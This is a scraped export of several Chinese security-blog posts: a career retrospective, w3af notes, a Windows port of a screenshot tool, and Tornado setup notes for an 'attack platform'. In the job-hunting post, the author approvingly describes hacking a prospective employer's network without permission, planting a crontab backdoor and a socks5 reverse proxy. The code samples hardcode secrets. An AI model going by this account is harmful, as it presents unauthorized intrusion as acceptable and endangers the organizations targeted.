&emsp;&emsp;在分别承担起某一项任务之余，我建了一个小的微信群，取名“捡垃圾”，哈哈哈~里面有我和华不再扬、YD，主要是团结协作一起写poc，我们把收集到的Python脚本的exp或poc，用lua进行转化重写，写完样本之后，就在网络上收集漏洞进行分析，并也转化成lua脚本，我们的github上应该有上千个poc了吧。后来“捡垃圾”就变成了我们3个人闲聊扯淡的小群咯~我喜欢取一些特别的名字，比如我们深圳分部的微信群叫做“小白兔白又白”，哈哈哈哈哈。 &emsp;&emsp;在深圳的后面几个月开始支持独立部署的客户，将产品整个server端部署到客户的机房，有多种不同的方案，学到了很多Linux运维方面的技能，0x001是比我晚一些接手这项工作的，但老司机毕竟是老司机，我竟然都开始问他部署的各种依赖包解决的问题和部署脚本的问题等等。接着就是南方各个城市的出差，去的甲方也都是各行业的top级别的，拓宽了自己的视野，也认识了一些不错的负责人。比如做事风格非常屌，人很nice的某直播行业的安全负责人，希望有机会去武汉吃小龙虾。 &emsp;&emsp;在青藤的那些日子里，也做过多次的应急响应，其中有一次对日志的排查，很感谢现在的北京的安全总监对我提供的帮助，他的实力也毋庸置疑，并且做安全工作非常有经验和条理。从深圳到北京培训的那些日子，他教会了我很多教科书式的工作方法，比如应急报告应该怎样写，要注意的多个问题，他也硬生生的带我吃好吃的把我养肥了好多斤，最后培训的结果并不令他很满意，我也感到很抱歉。在应急响应的不同案例中，我个人认为要彻底回溯还原攻击场景和修复安全问题，不仅仅需要分析问题的能力，有一点也很重要，就是要了解攻击者的目的和“玩法”。比如，有一次的问题排查过程中，问题基本解决，但从搜索引擎入口进行搜索发现该高权限站点，从搜索引擎点击到站点的点击行为都会进行跳转，若直接打开站点的页面就不会跳转。这是一种黑帽的手法，服务器上并不存在webshell，只加了一些判断ua进行跳转的代码。于是我们从伪静态规则和站点模板进行再次深入排查，最终定位到了一句恶意代码，并通过在产品的后台添加规则，通过agent马上识别出了10多个被加入恶意代码的模板文件。使用SaaS产品的好处就是可以从一家客户的攻击到问题的解决，将整个安全防护和检测规则及时同步到其他客户那里，迅速保护客户资产免受侵害。所以安全从业人员也应该关注威胁情报，关注互联网底层黑客活动，以及利益驱动的各种黑客攻击和手法，知己知彼才能百战不殆。 离职前的网投简历&emsp;&emsp;在我提交离职邮件之前，我先在拉钩上写了一份简历，并尝试投递了几家心仪的公司。因为在创业公司工作过一段时间，甚至在深圳连行政角色都体验过，人难免容易产生优越感，往往把自己定位的过高。网投的时候我刻意避开了北京的一些跟公司有业务来往的企业，心理觉得是不是会有些尴尬。我也问过几个好朋友，他们的建议是没啥，是我自己想太多了。 &emsp;&emsp;A公司，薪水20K起，我的简历被直接转发给了安全负责人，经过沟通过后希望我能挖一个漏洞给他，我挖到了一个刷短信接口的漏洞，对方研发反馈说是一个feature，不算漏洞。没关系，我不争辩，继续看业务逻辑，继续挖到了一个短信炸弹的参数，这个短信接口很多参数都做了限制，唯独其中一个参数没有做限制，反馈了；找外网的漏洞，穿过cdn找到了业务网段，并发现了一个监控全国路由节点的系统smokeping，反馈了本想利用一下，对方马上把此服务器停止对外服务；实在挖的很累，期间也做了很多其他工作，谈薪水的时候说只能给15K，要20k，必须找到外网的严重漏洞。 我说：谢谢，我再看看其他机会。 &emsp;&emsp;B公司，薪水20K起，hr电话邀请北京面试，但我在深圳，来回的成本实在太高，所以协商过后可以远程电话面试，对方安全负责人问了很多问题，其中包括：去深圳的原因、给我一个网站怎么入手、web安全常见的漏洞、业务逻辑的例子、重放攻击（短信验证码炸弹）如何修复、甲方的产品安全应该如何做、SDL有什么好的落地方法、众多服务器的情况下如何检测webshll、开源安全产品了解哪些、对网络操作系统熟悉吗、看你对Python熟悉还有其他的编程语言吗。个人感觉除了sdl回答的不好，其他问题都hold住了。第二天问hr反馈，结果是“跟XX的需求不匹配，你的能力偏重测试领域，甲方经验略少，思维方面不太契合。面试官给的建议是了解一下SDL或类似的产品安全管理体系和落地方法。祝好！” 感觉hr说的很中肯，我确实缺少甲方的工作经验和一些体系化的工作方法和理论与实践。 &emsp;&emsp;C公司，薪水15K-25K，该公司还没有安全人员，我在B公司碰壁后，自然信心不足了，直接跟hr说了自己的欠缺的能力和擅长的事情，并希望可以远程面试。hr反馈不可以远程，希望现场面试，说我的情况比较符合C公司的需求。我于是当天晚上对其外网C段进行了检测，干进了内网，并做了crontab的后门和socks5的反弹进行内网渗透，发现了多个内网网段和不同程度的未授权访问等。第二天凌晨3点多给hr留言，发现安全问题，即使并不去贵公司也会将漏洞反馈给对方。第二天运维的老大跟我对接，并修复了外网的安全隐患。 准备到C公司面试 &emsp;&emsp;其他，其实也有朋友要帮忙内推，心里很感谢。我想自己提前感受下社会的招人需求和氛围，一开始并没有接受，就开始了以上3家公司的面试经历，还是很多收获。更清楚的了解了自己的真实水平，以及对自己职业的定位，把浮躁的心安抚了一下。感受了下失业者无所事事的心情，还好有我家宝宝和“狐朋狗友”~ &emsp;&emsp;即使自己曾经对公司有过抱怨，即使工作上有些许不如意，但青藤是我的一份工作，我与他一起成长。如果我到一家公司能够决定买一款安全产品，我肯定会把青藤纳入考虑范围，因为它首先让我知道自己的风险资产在哪里，从根源上减少攻击面，更重要的是它在黑客攻击的每个路径上都有特征锚点，让我及时发现入侵行为。听说过段时间V3.0版本就要问世了，很遗憾没有给V3.0注入自己的贡献，还是挺羡慕北京安全团队对产品的输出，对应用的检测和windows版本功能调研与开发，羡慕sevck和一夜30万郎，还有演讲能力超赞的刘磊，还有emma等等哈哈哈。 谢谢你们，加油吧！","tags":[{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"黑客","slug":"黑客","permalink":"http://pirogue.org/tags/黑客/"},{"name":"工作生活","slug":"工作生活","permalink":"http://pirogue.org/tags/工作生活/"},{"name":"乙方安全","slug":"乙方安全","permalink":"http://pirogue.org/tags/乙方安全/"}]},{"title":"w3af 二次开发手记","date":"2017-05-04T10:01:32.000Z","path":"2017/05/04/w3af/","text":"w3af 常用命令 w3af_console 1w3af&gt;&gt;&gt; w3af&gt;&gt;&gt; help 123456789101112131415161718192021w3af&gt;&gt;&gt; help|-----------------------------------------------------------------------------|| start | Start the scan. || plugins | Enable and configure plugins. || exploit | Exploit the vulnerability. || profiles | List and use scan profiles. || cleanup | Cleanup before starting a new scan. ||-----------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. || misc-settings | Configure w3af misc settings. || target | Configure the target URL. ||-----------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. || assert | Check assertion. ||-----------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more || | specific help about &quot;command&quot; || version | Show w3af version information. || keys | Display key shortcuts. ||-----------------------------------------------------------------------------| w3af&gt;&gt;&gt; version 123456w3af&gt;&gt;&gt; versionw3af - Web Application Attack and Audit FrameworkVersion: 1.2Revision: unknownDistribution: DebianAuthor: Andres Riancho and the w3af team. 最近没时间研究咯~待续","tags":[{"name":"漏洞扫描器","slug":"漏洞扫描器","permalink":"http://pirogue.org/tags/漏洞扫描器/"},{"name":"w3af","slug":"w3af","permalink":"http://pirogue.org/tags/w3af/"}]},{"title":"peepingtom for windows","date":"2017-04-26T17:17:27.000Z","path":"2017/04/27/peepingtom/","text":"工具效果截图 工具说明 工具非原创，只是原版工具仅仅支持Linux，需要依赖curl、phantomjs，且在Linux下调用和执行的参数不支持Windows，而本人经常在win下耕耘，所以将其调试改写成了Windows，不需要依赖任何第三方组件。因为已经把windows下的curl.exe和phantomjs.exe等依赖文件统统放在脚本根目录。 官方Linux原版：https://bitbucket.org/LaNMaSteR53/peepingtom 本人Windows改写版本：https://github.com/p1r06u3/peepingtom-for-windows 使用方法1python peepingtom.py -l xxx.txt -v -h 查看更多使用参数介绍。 命令解释补充 txt文件里面存放的是一行一个的网址（必须加上http或者https的头，否则无法截取目标网站图片，当然工具可以优化下做个判断自动加，算是一个坑）。方便在渗透测试时获取大量目标子域名或ip+端口，迅速肉眼判断是否易于收到攻击（比如直接看到一些后台、第三方组件的console、奇怪的页面等）。左侧截图，右侧head。 实践本人另外写了一个日常安全运营工作的自动化拉取，提交数据的脚本，配合此工具（当然为了配合工作，又将peepingtom定制了一下）短时间内处理了某客户将近2000个url地址，然后判断是否是后台，半自动化标记后台，节省大量时间，简化繁杂工作。现已经推广到部门的小伙伴使用。 国内下载地址链接: https://pan.baidu.com/s/1eStaVKm 密码: 47n5","tags":[{"name":"截屏","slug":"截屏","permalink":"http://pirogue.org/tags/截屏/"},{"name":"python","slug":"python","permalink":"http://pirogue.org/tags/python/"},{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"黑客","slug":"黑客","permalink":"http://pirogue.org/tags/黑客/"},{"name":"信息收集","slug":"信息收集","permalink":"http://pirogue.org/tags/信息收集/"}]},{"title":"tornado-durex-Web自动化攻击平台-开发手记(一)","date":"2017-04-07T13:27:40.000Z","path":"2017/04/07/durex/","text":"参数handlers1app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)]) 元组组成的列表 get_argument方法RequestHandler对象的get_argument方法来捕获请求查询字符串的参数。 123456class WrapHandler(tornado.web.RequestHandler): def post(self): text = self.get_argument('text') width = self.get_argument('width', 40) self.write(textwrap.fill(text, int(width))) http方法Tornado支持任何合法的HTTP请求（GET、POST、PUT、DELETE、HEAD、OPTIONS） http状态码set_status()方法显式地设置HTTP状态码 123456class FrobHandler(tornado.web.RequestHandler): def head(self, frob_id): frob = retrieve_from_db(frob_id) if frob is not None: self.set_status(200) 重写write_error()方法在你的RequestHandler类中 12345678class IndexHandler(tornado.web.RequestHandler): def get(self): greeting = self.get_argument('greeting', 'Hello') self.write(greeting + ', friendly user!') def write_error(self, status_code, **kwargs): self.write(\"Gosh darnit, user! You caused a %d error.\" % status_code) Anaconda2和3在windows共存先正常完全安装好Anaconda2，然后下载Anaconda3，将Anaconda3安装在X:Anaconda2\\envs\\py3下，3安装时取消勾选Advanced Options的两个复选框。 使用时命令：activate py3 设置虚拟环境(virtualenv)使用python3开发tornado 进入项目目录:G:\\Coding\\python\\durex activate py3 pip install virtualenv virtualenv env env\\Scripts\\activate 显示如下： 1(env) (py3) Administrator@pirogue G:\\Coding\\python\\durex pip install tornado 项目分层 模板绑定一个简单的server web ， 在tornado的单文件py里直接定义settings和url以及url对应的handler映射关系就可以了。 不过在这里将项目分层后，我们也将每部分配置和功能代码分离出来 server.py 123456789101112131415161718192021222324252627282930#!/usr/bin/env python#coding:utf-8\"\"\" Author: pirogue --&lt;p1r06u3@gmail.com&gt; Purpose: Web服务启动文件 Created: 2017/4/6 Site: http://pirogue.org\"\"\" import tornado.httpserverimport tornado.ioloopimport tornado.webimport tornado.autoreload from application import settingsfrom url import url from tornado.options import define, optionsdefine(\"port\", default=8888, help=\"run on the given port\", type=int) if __name__ == '__main__': tornado.options.parse_command_line() app = tornado.web.Application(handlers=url, **settings) http_server = tornado.httpserver.HTTPServer(app) http_server.listen(options.port) print('Development server is running at http://127.0.0.1:%s/' % options.port) tornado.ioloop.IOLoop.instance().start() url.py 12345678910111213141516171819202122 #!/usr/bin/env python#coding:utf-8\"\"\" Author: pirogue --&lt;p1r06u3@gmail.com&gt; Purpose: URL路由配置文件 Created: 2017/4/8 Site: http://pirogue.org\"\"\" from handlers import login url = [ # LoginHandler url (r\"/login\", login.LoginHandler), (r\"/\", login.MainHandler), (r\"/logout\", login.LogoutHandler),] if __name__ == '__main__': unittest.main() handler/login.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/env python#coding:utf-8\"\"\" Author: pirogue --&lt;p1r06u3@gmail.com&gt; Purpose: Created: 2017/4/8 Site: http://pirogue.org\"\"\" import tornado.webfrom dbs.initdb import Base, engine, DBSessionfrom dbs.models.users import User ########################################################################class BaseHandler(tornado.web.RequestHandler): \"\"\" 基础类 \"\"\" #---------------------------------------------------------------------- def get_current_user(self): \"\"\" 获取当前是否存在用户 \"\"\" return self.get_secure_cookie(\"email\") ########################################################################class LoginHandler(BaseHandler): \"\"\" 登录 \"\"\" #---------------------------------------------------------------------- def get(self): \"\"\"Constructor\"\"\" self.render(\"login.html\") def post(self): email = self.get_argument(\"email\", None) pwd = self.get_argument(\"password\", None).encode('utf8') if email and pwd: import hashlib pwd = hashlib.md5(pwd).hexdigest() if DBSession.query(User).filter(User.email == email, User.password == pwd).scalar(): self.set_secure_cookie( \"email\", email, expires_days=None, httponly=True ) self.render(\"index.html\") else: self.redirect(self.get_login_url(), permanent=True) else: self.redirect(self.get_login_url(), permanent=True) ########################################################################class MainHandler(BaseHandler): \"\"\"后台首页\"\"\" #---------------------------------------------------------------------- @tornado.web.authenticated def get(self): \"\"\"Constructor\"\"\" self.render('index.html') class LogoutHandler(BaseHandler): \"\"\" 退出 \"\"\" def get(self): self.clear_all_cookies() self.redirect(self.get_login_url()) if __name__ == '__main__': unittest.main() application.py 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python#coding:utf-8\"\"\" Author: pirogue --&lt;p1r06u3@gmail.com&gt; Purpose: 应用配置文件 Created: 2017/4/8 Site: http://pirogue.org\"\"\" import osimport logging settings = dict( # 设置Debug开关 debug = True, # 设置templates路径 template_path = os.path.join(os.path.dirname(__file__), \"templates\"), # 设置静态文件解析路径 static_path = os.path.join(os.path.dirname(__file__), \"assets\"), # 设置cookie密钥 cookie_secret = \"1234567890qwertyuiopasdnghjklzxcvbnm1234567890qwrtyu\", login_url = \"/login\",) # web日志配置logfile = os.path.join(os.path.dirname(__file__), \"logs\", \"app.log\")handler = logging.FileHandler(logfile)logger = logging.getLogger() logger.addHandler(handler)logger.setLevel(logging.NOTSET) python3、tornado、mysql（sqlalchemy） Tornado中sqlalchemy使用 https://segmentfault.com/a/1190000003856556 在Python3下使用tornado和SQLAlchemy实现一个简单的MVC网站 http://blog.csdn.net/xuzhigang_china/article/details/40377679 sqlalchemy入门记录 http://www.cnblogs.com/wswang/p/5826347.html Tornado sqlalchemy http://www.cnblogs.com/mosson/p/6071224.html Python操作MySQL -即pymysql/SQLAlchemy用法 http://www.cnblogs.com/pangguoping/p/5720322.html python的sqlalchemy框架略讲 https://www.androiddev.net/python-linux-sqlalchemy/ SQLAlchemy基础教程 http://www.codexiu.cn/python/SQLAlchemy%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/73/529/ SQLAlchemy本身无法操作数据库，其必须以来pymsql等第三方插件，Dialect用于和数据API进行交流，根据配置文件的不同调用不同的数据库API，从而实现对数据库的操作。 12345678910111213141516171819MySQL-Python mysql+mysqldb://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;[:&lt;port&gt;]/&lt;dbname&gt; python3 已经不支持mysqldb了 pymysql mysql+pymysql://&lt;username&gt;:&lt;password&gt;@&lt;host&gt;/&lt;dbname&gt;[?&lt;options&gt;] MySQL-Connector mysql+mysqlconnector://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;[:&lt;port&gt;]/&lt;dbname&gt; cx_Oracle oracle+cx_oracle://user:pass@host:port/dbname[?key=value&amp;key=value...] 更多详见：http://docs.sqlalchemy.org/en/latest/dialects/index.html 安装支持： 1234567891011121314151617181920212223(env) (py3) g:\\Coding\\python\\durex&gt;pip install sqlalchemy pip install sqlalchemyCollecting sqlalchemy Downloading SQLAlchemy-1.1.9.tar.gz (5.2MB)Building wheels for collected packages: sqlalchemy Running setup.py bdist_wheel for sqlalchemy: started Running setup.py bdist_wheel for sqlalchemy: finished with status &apos;done&apos; Stored in directory: C:\\Users\\Administrator\\AppData\\Local\\pip\\Cache\\wheels\\62\\c3\\8f\\12a643439a7ba36143e21533ac633b99da8537b1deb8d0f0c3Successfully built sqlalchemyInstalling collected packages: sqlalchemySuccessfully installed sqlalchemy-1.1.9 (env) (py3) Administrator@ORZ-HB G:\\Coding\\python\\durex $ pip install pymysql Collecting pymysql Downloading PyMySQL-0.7.11-py2.py3-none-any.whl (78kB) 100% |████████████████████████████████| 81kB 93kB/sInstalling collected packages: pymysqlSuccessfully installed pymysql-0.7.11 SQLAlchemy使用方法 连接数据库 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python#coding:utf-8\"\"\" Author: pirogue --&lt;p1r06u3@gmail.com&gt; Purpose: 初始化数据库 Created: 2017/4/12 Site: http://pirogue.org\"\"\" from sqlalchemy import create_enginefrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import sessionmaker # 数据库配置DB_HOST = '127.0.0.1'DB_USER = 'root'DB_PWD = 'roadfmima'DB_NAME = 'durex' # 创建对象基类Base = declarative_base() # 初始化数据库连接engine = create_engine('mysql+pymysql://%s:%s@%s/%s?charset=utf8' % (DB_USER, DB_PWD, DB_HOST, DB_NAME), encoding='utf-8', echo=True, pool_size=100, pool_recycle=10) # 创建DBsession类型Session = sessionmaker(bind=engine)DBSession = Session() sqlalchemy.schema包里有数据库关系描述 字段： Column 索引： Index 表： Table sqlalchemy.types包里有数据类型 二进制： BIGINIT 布尔： Index 字符： CHAR 可变字符： VARCHAR 日期： DATETIME sqlalchemy.sql包里有操作方法 execute, update, insert, select, delete, join等 用户数据库模型以及添加测试数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python#coding:utf-8\"\"\" Author: pirogue --&lt;p1r06u3@gmail.com&gt; Purpose: 用户关系模型 Created: 2017/4/12 Site: http://pirogue.org\"\"\" from datetime import datetimefrom sqlalchemy import Column, String, Integer, Unicode, TIMESTAMPfrom sqlalchemy.orm import relationship, backref# import sys# sys.path.append(\"..\")from dbs.initdb import Base, engine, DBSession class User(Base): __tablename__ = 'user' id = Column(Integer, autoincrement=True, primary_key=True) username = Column(Unicode(50), nullable=False) email = Column(String(50), nullable=False) password = Column(String(32), nullable=False) create_time = Column(TIMESTAMP, default=datetime.now) def init_db(): Base.metadata.create_all(engine) def drop_db(): Base.metadata.drop_all(engine) if __name__==\"__main__\": init_db() #drop_db() # user_data = User() # user_data.username = 'pirogue' # user_data.email = '980555216@qq.com' # user_data.password = 'e4d755e3f2bb546909d9703c4681a171' # DBSession.add(user_data) # DBSession.flush() # DBSession.commit() print('create user table') python采用pika库使用rabbitmq总结，多篇笔记和示例http://blog.csdn.net/chenjiebin/article/details/8253433 w3af_api 学习http://0cx.cc/tag/w3af/ https://pypi.python.org/pypi/w3af-api-client http://docs.w3af.org/en/latest/api/index.html 切换开发环境到Ubuntu 16.04 LTS + python2 原因windows下开发编译很多Python的第三方库心累，也有部分第三方的工具是用Python2写的，研究并迁移精力有限。 123root@ubuntu:/coding/python/durex# source env/bin/activate (env) root@ubuntu:/coding/python/durex# pip install pymysql pip时发现异常的慢 囧 修改pip更新源 在主目录下创建.pip文件夹 1mkdir ~/.pip 然后在该目录下创建pip.conf文件编写如下内容：123[global]trusted-host = pypi.douban.comindex-url = http://pypi.douban.com/simple 这里以豆瓣的源为例，由于最新的pip安装需要使用的https加密，所以在此需要添加trusted-host对于window系统来说基本配置相同创建或修改配置文件在%HOMEPATH%\\pip\\pip.ini 12345678910(env) root@ubuntu:/coding/python/durex# pip install sqlalchemyCollecting sqlalchemy Downloading http://pypi.doubanio.com/packages/02/69/9473d60abef55445f8e967cfae215da5de29ca21b865c99d2bf02a45ee01/SQLAlchemy-1.1.9.tar.gz (5.2MB) 100% |████████████████████████████████| 5.2MB 3.4MB/s Building wheels for collected packages: sqlalchemy Running setup.py bdist_wheel for sqlalchemy ... done Stored in directory: /root/.cache/pip/wheels/a9/5a/66/2ff71109f1ed14eb4ce8e88eacd8478c0f162bc23f847fe77dSuccessfully built sqlalchemyInstalling collected packages: sqlalchemySuccessfully installed sqlalchemy-1.1.9 每秒3.4MB，心情舒畅多了~么么1(env) root@ubuntu:/coding/python/durex# pip install tornado 安装w3af依赖1234567sudo apt-get install libxml2-dev libxslt1-dev python-devsudo apt-get install zlib1g-devsudo apt-get install libevent-devsudo apt-get install libssl-devpip install pybloomfiltermmap==0.3.14 esmre==0.3.1 phply==0.9.1 nltk==3.0.1 chardet==2.1.1 tblib==0.2.0 pdfminer==20140328 futures==2.1.5 pyOpenSSL==0.15.1 ndg-httpsclient==0.3.3 pyasn1==0.1.9 lxml==3.4.4 scapy-real==2.2.0-dev guess-language==0.2 cluster==1.1.1b3 msgpack-python==0.4.4 python-ntlm==1.0.1 halberd==0.2.4 darts.util.lru==0.5 Jinja2==2.7.3 vulndb==0.0.19 markdown==2.6.1 psutil==2.2.1 termcolor==1.1.0 mitmproxy==0.13 ruamel.ordereddict==0.4.8 Flask==0.10.1 PyYAML==3.12 tldextract==1.7.2 sudo apt-get -y install libyaml-dev git libsqlite3-dev Ubuntu Linux平台下Python集成开发环境Wing IDE无法输入中文的问题12345678910111213141516171819202122232425root@ubuntu:~# dpkg -L fcitx-frontend-qt5 /./usr/usr/lib/usr/lib/x86_64-linux-gnu/usr/lib/x86_64-linux-gnu/qt5/usr/lib/x86_64-linux-gnu/qt5/plugins/usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts/usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts/libfcitxplatforminputcontextplugin.so/usr/share/usr/share/doc/usr/share/doc/fcitx-frontend-qt5/usr/share/doc/fcitx-frontend-qt5/README/usr/share/doc/fcitx-frontend-qt5/copyright/usr/share/doc/fcitx-frontend-qt5/changelog.Debian.gz root@ubuntu:~# cd /usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts/root@ubuntu:/usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts# lslibcomposeplatforminputcontextplugin.so libibusplatforminputcontextplugin.solibfcitxplatforminputcontextplugin.so root@ubuntu:/usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts# cp libfcitxplatforminputcontextplugin.so /usr/lib/wingide6/bin/runtime-qt5.5/plugins/platforminputcontexts/ root@ubuntu:/usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts# 框架代码向w3af post数据需要requests库1pip install requests w3af 安装gui依赖1234567sudo apt-get -y install python-webkit python-gtksourceview2 python-gtk2 graphviz pip install xdot==0.6 - PyGTK &gt;= 2.12 - GTK &gt;= 2.12 这里遇到一个大坑： 不能在虚拟环境中安装PyGTK和gtk！百度、谷歌了N久。 Install pygtk inside of a virtualenv 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# Ensure we're in a virtualenv. if [ \"$VIRTUAL_ENV\" == \"\" ]then echo \"ERROR: not in a virtual environment.\" exit -1fi# Setup variables.CACHE=\"/tmp/install-pygtk-$$\" # Make temp directory.mkdir -p $CACHE # Test for py2cairo.echo -e \"\\E[1m * Checking for cairo...\\E[0m\"python -c \"try: import cairo; raise SystemExit(0)except ImportError: raise SystemExit(-1)\" if [ $? == 255 ]then echo -e \"\\E[1m * Installing cairo...\\E[0m\" # Fetch, build, and install py2cairo. ( cd $CACHE curl 'http://cairographics.org/releases/py2cairo-1.10.0.tar.bz2' &gt; \"py2cairo.tar.bz2\" tar -xvf py2cairo.tar.bz2 ( cd py2cairo* autoreconf -ivf ./configure --prefix=$VIRTUAL_ENV --disable-dependency-tracking make make install ) )fi # Test for gobject.echo -e \"\\E[1m * Checking for gobject...\\E[0m\"python -c \"try: import gobject; raise SystemExit(0)except ImportError: raise SystemExit(-1)\" if [ $? == 255 ]then echo -e \"\\E[1m * Installing gobject...\\E[0m\" # Fetch, build, and install gobject. ( cd $CACHE curl 'http://ftp.gnome.org/pub/GNOME/sources/pygobject/2.28/pygobject-2.28.6.tar.bz2' &gt; 'pygobject.tar.bz2' tar -xvf pygobject.tar.bz2 ( cd pygobject* ./configure --prefix=$VIRTUAL_ENV --disable-introspection make make install ) )fi # Test for gtk.echo -e \"\\E[1m * Checking for gtk...\\E[0m\"python -c \"try: import gtk; raise SystemExit(0)except ImportError: raise SystemExit(-1)\" 2&amp;&gt; /dev/nullif [ $? == 255 ]then echo -e \"\\E[1m * Installing gtk...\\E[0m\" # Fetch, build, and install gtk. ( cd $CACHE curl 'https://pypi.python.org/packages/source/P/PyGTK/pygtk-2.24.0.tar.bz2' &gt; 'pygtk.tar.bz2' tar -xvf pygtk.tar.bz2 ( cd pygtk* ./configure --prefix=$VIRTUAL_ENV PKG_CONFIG_PATH=/usr/local/lib/pkgconfig:$VIRTUAL_ENV/lib/pkgconfig make make install ) )fi 封装李劼杰的子域名扫描 https://github.com/lijiejie/subDomainsBrute windows 下pip install esmre==0.3.112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ pip install esmre==0.3.1Collecting esmre==0.3.1 Using cached esmre-0.3.1.tar.gzRequirement already satisfied: setuptools in g:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\lib\\site-packages (from esmre==0.3.1)Building wheels for collected packages: esmre Running setup.py bdist_wheel for esmre ... error Complete output from command g:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\scripts\\python.exe -u -c &quot;import setuptools, tokenize;__file__=&apos;c:\\\\users\\\\admini~1\\\\appdata\\\\local\\\\temp\\\\pip-build-attjnf\\\\esmre\\\\setup.py&apos;;f=getattr(tokenize, &apos;open&apos;, open)(__file__);code=f.read().replace(&apos;\\r\\n&apos;, &apos;\\n&apos;);f.close();exec(compile(code, __file__, &apos;exec&apos;))&quot; bdist_wheel -d c:\\users\\admini~1\\appdata\\local\\temp\\tmpl1xblipip-wheel- --python-tag cp27: running bdist_wheel running build running build_py creating build creating build\\lib.win-amd64-2.7 copying src\\esmre.py -&gt; build\\lib.win-amd64-2.7 running build_ext building &apos;esm&apos; extension creating build\\temp.win-amd64-2.7 creating build\\temp.win-amd64-2.7\\Release creating build\\temp.win-amd64-2.7\\Release\\src C:\\Users\\Administrator\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\\9.0\\VC\\Bin\\amd64\\cl.exe /c /nologo /Ox /MD /W3 /GS- /DNDEBUG -Ig:\\myenv\\anaconda2\\include -Ig:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\PC /Tcsrc/esm.c /Fobuild\\temp.win-amd64-2.7\\Release\\src/esm.obj esm.c C:\\Users\\Administrator\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\\9.0\\VC\\Bin\\amd64\\cl.exe /c /nologo /Ox /MD /W3 /GS- /DNDEBUG -Ig:\\myenv\\anaconda2\\include -Ig:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\PC /Tcsrc/aho_corasick.c /Fobuild\\temp.win-amd64-2.7\\Release\\src/aho_corasick.obj aho_corasick.c src/aho_corasick.c(48) : fatal error C1083: Cannot open include file: &apos;stdbool.h&apos;: No such file or directory error: command &apos;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Programs\\\\Common\\\\Microsoft\\\\Visual C++ for Python\\\\9.0\\\\VC\\\\Bin\\\\amd64\\\\cl.exe&apos; failed with exit status 2 ---------------------------------------- Failed building wheel for esmre Running setup.py clean for esmreFailed to build esmreInstalling collected packages: esmre Running setup.py install for esmre ... error Complete output from command g:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\scripts\\python.exe -u -c &quot;import setuptools, tokenize;__file__=&apos;c:\\\\users\\\\admini~1\\\\appdata\\\\local\\\\temp\\\\pip-build-attjnf\\\\esmre\\\\setup.py&apos;;f=getattr(tokenize, &apos;open&apos;, open)(__file__);code=f.read().replace(&apos;\\r\\n&apos;, &apos;\\n&apos;);f.close();exec(compile(code, __file__, &apos;exec&apos;))&quot; install --record c:\\users\\admini~1\\appdata\\local\\temp\\pip-lcnnxs-record\\install-record.txt --single-version-externally-managed --compile --install-headers g:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\include\\site\\python2.7\\esmre: running install running build running build_py creating build creating build\\lib.win-amd64-2.7 copying src\\esmre.py -&gt; build\\lib.win-amd64-2.7 running build_ext building &apos;esm&apos; extension creating build\\temp.win-amd64-2.7 creating build\\temp.win-amd64-2.7\\Release creating build\\temp.win-amd64-2.7\\Release\\src C:\\Users\\Administrator\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\\9.0\\VC\\Bin\\amd64\\cl.exe /c /nologo /Ox /MD /W3 /GS- /DNDEBUG -Ig:\\myenv\\anaconda2\\include -Ig:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\PC /Tcsrc/esm.c /Fobuild\\temp.win-amd64-2.7\\Release\\src/esm.obj esm.c C:\\Users\\Administrator\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\\9.0\\VC\\Bin\\amd64\\cl.exe /c /nologo /Ox /MD /W3 /GS- /DNDEBUG -Ig:\\myenv\\anaconda2\\include -Ig:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\PC /Tcsrc/aho_corasick.c /Fobuild\\temp.win-amd64-2.7\\Release\\src/aho_corasick.obj aho_corasick.c src/aho_corasick.c(48) : fatal error C1083: Cannot open include file: &apos;stdbool.h&apos;: No such file or directory error: command &apos;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Programs\\\\Common\\\\Microsoft\\\\Visual C++ for Python\\\\9.0\\\\VC\\\\Bin\\\\amd64\\\\cl.exe&apos; failed with exit status 2 ----------------------------------------Command &quot;g:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\scripts\\python.exe -u -c &quot;import setuptools, tokenize;__file__=&apos;c:\\\\users\\\\admini~1\\\\appdata\\\\local\\\\temp\\\\pip-build-attjnf\\\\esmre\\\\setup.py&apos;;f=getattr(tokenize, &apos;open&apos;, open)(__file__);code=f.read().replace(&apos;\\r\\n&apos;, &apos;\\n&apos;);f.close();exec(compile(code, __file__, &apos;exec&apos;))&quot; install --record c:\\users\\admini~1\\appdata\\local\\temp\\pip-lcnnxs-record\\install-record.txt 